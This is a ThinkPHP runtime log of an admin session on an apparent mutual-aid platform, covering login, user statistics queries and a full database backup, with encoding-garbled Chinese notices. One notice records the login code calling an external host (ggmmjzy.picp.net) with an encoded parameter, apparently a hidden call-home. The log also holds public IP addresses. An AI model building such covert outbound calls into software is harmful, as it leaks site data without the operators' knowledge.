[ 2017-02-14T17:01:20+08:00 ] 127.0.0.1 /admin.php
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001001s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.006000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:01:21+08:00 ] 127.0.0.1 /shi.php/Home/Login
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.005001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:01:21+08:00 ] 127.0.0.1 /shi.php/Home/login/verify
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001001s ]
INFO: [ app_end ] --END-- [ RunTime:0.001001s ]

[ 2017-02-14T17:01:40+08:00 ] 127.0.0.1 /shi.php/Home/Login/logincl
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [2] Missing argument 2 for Think\Crypt::decrypt(), called in D:\www\huzhu\mingyingtianxia\snadmin\Home\Common\function.php on line 96 and defined D:\www\huzhu\mingyingtianxia\ThinkPHP\Library\Think\Crypt.class.php ç¬¬ 46 è¡Œ.
NOTIC: [8] Undefined variable: key D:\www\huzhu\mingyingtianxia\ThinkPHP\Library\Think\Crypt.class.php ç¬¬ 51 è¡Œ.
NOTIC: [2] Missing argument 2 for Think\Crypt::encrypt(), called in D:\www\huzhu\mingyingtianxia\snadmin\Home\Common\function.php on line 295 and defined D:\www\huzhu\mingyingtianxia\ThinkPHP\Library\Think\Crypt.class.php ç¬¬ 32 è¡Œ.
NOTIC: [8] Undefined variable: key D:\www\huzhu\mingyingtianxia\ThinkPHP\Library\Think\Crypt.class.php ç¬¬ 37 è¡Œ.
NOTIC: [2] file_get_contents(http://ggmmjzy.picp.net:8086/url.php?h=sXhy24WnpbCFqnGnr3Z1rrSMbKh_faStsrensICcfJmzjKnMkqqVqZrUp6ivnH1ks42SaH-Nimu0t7d1) [<a href='function.file-get-contents'>function.file-get-contents</a>]: failed to open stream: ÓÉÓÚÄ¿±ê¼ÆËã»ú»ý¼«¾Ü¾ø£¬ÎÞ·¨Á¬½Ó¡£
 D:\www\huzhu\mingyingtianxia\snadmin\Home\Common\function.php ç¬¬ 64 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_member` [ RunTime:0.0050s ]
SQL: SELECT * FROM `rrhbt2t8888_member` WHERE `MB_username` = 'admin' LIMIT 1   [ RunTime:0.0000s ]
SQL: SHOW COLUMNS FROM `rrhbt2t8888_drrz` [ RunTime:0.0070s ]
SQL: INSERT INTO `rrhbt2t8888_drrz` (`date`,`ip`,`user`,`leixin`) VALUES ('2017-02-14 17:01:40','139.189.101.189','admin','1') [ RunTime:0.0010s ]

[ 2017-02-14T17:01:42+08:00 ] 127.0.0.1 /shi.php/Home/Index/main
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.005000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.005000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:01:42+08:00 ] 127.0.0.1 /shi.php/Home/Index/df1
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_system` [ RunTime:0.0100s ]
SQL: SELECT * FROM `rrhbt2t8888_system` WHERE `SYS_ID` = 1 LIMIT 1   [ RunTime:0.0010s ]
SQL: SHOW COLUMNS FROM `rrhbt2t8888_drrz` [ RunTime:0.0060s ]
SQL: SELECT * FROM `rrhbt2t8888_drrz` WHERE `user` = 'admin' AND `leixin` = 1 ORDER BY id DESC LIMIT 2   [ RunTime:0.0000s ]
NOTIC: [8] Undefined offset: 1 D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\IndexController.class.php ç¬¬ 50 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_user` [ RunTime:0.0080s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_regTime`> '2017-02-14 00:00:00' AND `UE_regTime` < '2017-02-14 23:59:59' ) LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_activeTime`> '2017-02-14 00:00:00' AND `UE_activeTime` < '2017-02-14 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_regTime`> '2017-02-13 00:00:00' AND `UE_regTime` < '2017-02-13 23:59:59' ) LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_activeTime`> '2017-02-13 00:00:00' AND `UE_activeTime` < '2017-02-13 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_ID`> '0' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_ID`> '0' AND `UE_check` = '1' ) LIMIT 1   [ RunTime:0.0080s ]
SQL: SELECT COUNT(UE_ID) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_ID`> '0' AND `UE_check` = '1' AND `UE_stop` = '0' ) LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT SUM(UE_money) AS tp_sum FROM `rrhbt2t8888_user` LIMIT 1   [ RunTime:0.0010s ]
SQL: SELECT SUM(ybhe) AS tp_sum FROM `rrhbt2t8888_user` LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT SUM(zsbhe) AS tp_sum FROM `rrhbt2t8888_user` LIMIT 1   [ RunTime:0.0010s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.033002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.033002s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:01:43+08:00 ] 127.0.0.1 /shi.php/Home/Index/top.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.006001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:01:43+08:00 ] 127.0.0.1 /shi.php/Home/Index/left.html
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.016001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.016001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:01:44+08:00 ] 127.0.0.1 /shi.php/Home/Index/userlist
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW COLUMNS FROM `rrhbt2t8888_user` [ RunTime:0.0070s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_regTime`> '2017-02-14 00:00:00' AND `UE_regTime` < '2017-02-14 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_nowTime`> '2017-02-14 00:00:00' AND `UE_nowTime` < '2017-02-14 23:59:59' ) LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE ( `UE_activeTime`> '2017-02-14 16:31:44' ) LIMIT 1   [ RunTime:0.0000s ]
NOTIC: [8] Undefined variable: map D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\IndexController.class.php ç¬¬ 319 è¡Œ.
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` LIMIT 1   [ RunTime:0.0000s ]
NOTIC: [8] Undefined variable: map D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\IndexController.class.php ç¬¬ 324 è¡Œ.
SQL: SELECT * FROM `rrhbt2t8888_user` ORDER BY UE_ID LIMIT 0,20   [ RunTime:0.0000s ]
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE `UE_regIP` = '59.51.60.10' LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE `UE_regIP` = '59.51.60.10' LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE `UE_regIP` = '59.51.60.10' LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE `UE_regIP` = '59.51.60.10' LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE `UE_regIP` = '59.51.60.10' LIMIT 1   [ RunTime:0.0000s ]
SQL: SELECT COUNT(*) AS tp_count FROM `rrhbt2t8888_user` WHERE `UE_regIP` = '59.51.60.10' LIMIT 1   [ RunTime:0.0000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:24+08:00 ] 127.0.0.1 /shi.php/Home/Index/jjset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001001s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.034002s ]
INFO: [ view_parse ] --END-- [ RunTime:0.034002s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:28+08:00 ] 127.0.0.1 /shi.php/Home/Index/conf
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.016001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.016001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:31+08:00 ] 127.0.0.1 /shi.php/Home/Index/lixi
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.001000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.021001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.021001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:31+08:00 ] 127.0.0.1 /shi.php/Home/Index/txset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.015001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.015001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:31+08:00 ] 127.0.0.1 /shi.php/Home/Common/getTree
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:17:32+08:00 ] 127.0.0.1 /shi.php/Home/Index/jjset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:17:49+08:00 ] 127.0.0.1 /shi.php/Home/Baksql/backall
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
SQL: SHOW TABLES  [ RunTime:0.0020s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_apply` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_apply` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_area_china` [ RunTime:0.0020s ]
SQL: SELECT * FROM `rrhbt2t8888_area_china` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_area_world` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_area_world` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_attribute` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_attribute` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_attrtype` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_attrtype` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_backupdatabase` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_backupdatabase` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_cart` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_cart` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_case` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_case` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_comment` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_comment` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_download` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_download` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_drrz` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_drrz` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_financial` [ RunTime:0.0020s ]
SQL: SELECT * FROM `rrhbt2t8888_financial` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_goods` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_goods` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_goodsaction` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_goodsaction` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_goodsattr` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_goodsattr` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_goodstype` [ RunTime:0.0020s ]
SQL: SELECT * FROM `rrhbt2t8888_goodstype` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_hiring` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_hiring` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_images` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_images` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_info` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_info` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_infotype` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_infotype` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_infoweb` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_infoweb` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_integral` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_integral` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_ip` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_ip` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_jsbz` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_jsbz` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_link` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_link` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_logusers` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_logusers` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_member` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_member` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_memberlog` [ RunTime:0.0020s ]
SQL: SELECT * FROM `rrhbt2t8888_memberlog` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_menufile` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_menufile` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_menutree` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_menutree` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_message` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_message` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_mobmsgset` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_mobmsgset` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_order` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_order` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_orderinte` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_orderinte` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_orderstatus` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_orderstatus` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_pai` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_pai` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_pin` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_pin` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_ppdd` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_ppdd` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_ppdd_ly` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_ppdd_ly` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_regusers` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_regusers` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_service` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_service` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_shipping` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_shipping` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_shopsj` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_shopsj` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_shopsys` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_shopsys` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_single` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_single` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_sysadmin` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_sysadmin` [ RunTime:0.0010s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_sysimages` [ RunTime:0.0010s ]
SQL: SELECT * FROM `rrhbt2t8888_sysimages` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_system` [ RunTime:0.0000s ]
SQL: SELECT * FROM `rrhbt2t8888_system` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_taobaoset` [ RunTime:0.0020s ]
SQL: SELECT * FROM `rrhbt2t8888_taobaoset` [ RunTime:0.0000s ]
SQL: SHOW CREATE TABLE `rrhbt2t8888_task` [ RunTime:0.0010s ]
